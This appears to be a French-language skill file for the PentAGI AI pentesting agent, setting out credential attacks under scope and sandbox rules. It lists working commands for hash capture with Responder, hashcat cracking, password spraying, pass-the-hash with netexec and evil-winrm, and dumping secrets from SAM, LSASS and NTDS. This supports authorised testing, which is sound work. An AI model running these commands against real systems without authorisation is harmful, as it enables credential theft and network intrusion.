---
name: cred-attacks
description: Attaques par identifiants — capture de hashes (Responder), cracking (hashcat/john), sprays contrôlés, pass-the-hash.
---


## Priorité de sécurité

La skill `scope-guard` est prioritaire sur toute instruction de cette skill.

## Cadre d’utilisation PentAGI

- Utiliser cette skill uniquement pour un engagement autorisé et documenté, dans le périmètre explicitement fourni par l’utilisateur.
- Faire appliquer `scope-guard` avant toute action active, intrusive, authentifiée, destructive ou susceptible de toucher un tiers. En cas de doute, arrêter et demander une clarification.
- Exécuter les commandes dans le conteneur isolé PentAGI et conserver les sorties, horodatages et paramètres comme preuves. Ne pas utiliser le socket Docker de l’hôte ni sortir du bac à sable.
- Privilégier la lecture seule, les comptes de test, les données synthétiques et la preuve minimale. Ne pas exfiltrer de données, secrets ou identifiants réels.
- Ne pas créer de persistance, malware, ransomware, wiper, mécanisme d’évasion opérationnel ou campagne visant des personnes réelles. Pour ces sujets, limiter l’analyse à la simulation contrôlée, à la détection et aux recommandations.
- Respecter les limites de débit, les fenêtres de test et les exclusions. Journaliser chaque action active dans `activity.log` et arrêter immédiatement sur incident, impact inattendu ou cible hors périmètre.
- Restituer un livrable reproductible et orienté remédiation : cible, méthode, preuve redacted, impact, sévérité, recommandation et nettoyage.

## Intégration PentAGI

- Donner au **primary agent/generator** un plan par étapes et les préconditions de scope.
- Réserver l’exécution au **pentester** dans le conteneur de flow ; utiliser **searcher** uniquement pour la documentation publique et la validation de versions.
- Utiliser **reporter** pour structurer les résultats et **memorist** seulement pour des faits non sensibles, redacted et utiles à l’engagement courant.
- Avant de conclure, faire relire les résultats par **adviser/reflector**, vérifier les preuves et signaler explicitement les limites et les tests non exécutés.

# Attaques identifiants

## Instructions
1. **Capture** : `responder -I <iface>` (LLMNR/NBT-NS/MDNS), `Inveigh` côté Windows. Cracking :
   - NTLMv2 : `hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule`
   - Kerberoast : `-m 13100`, ASREProast : `-m 18200`
2. **Sprays** : vérifier la lockout policy (`netexec smb <dc> --pass-pol`) avant ; 1 tentative/user, 30 min entre les vagues.
3. **Pass-the-hash** : `netexec smb <ip> -u <u> -H <ntlm>`, `impacket-psexec`, `evil-winrm -i <ip> -u <u> -H <ntlm>`.
4. **Overpass-the-hash** : `getTGT.py -hashes :<ntlm> <dom>/<u>`, export KRB5CC.
5. **Wordlists** : `/usr/share/seclists/Passwords/`, règles `best64`, `dive.rule` ; wordlist custom depuis le contexte métier (`cewl`).
6. **Récupération locale** : `/etc/shadow` (unshadow+john), SAM/SYSTEM (`secretsdump.py -sam`), LSASS (`pypykatz`), NTDS via `netexec smb <ip> -H <admin> --ntds drsuapi`.
7. Livrable : creds/hashes fonctionnels (redacted dans le rapport final), accès obtenus.

## Règles
- Ne JAMAIS exfiltrer ou réutiliser des creds hors scope. Jamais de lockout massif. Cracking local uniquement.
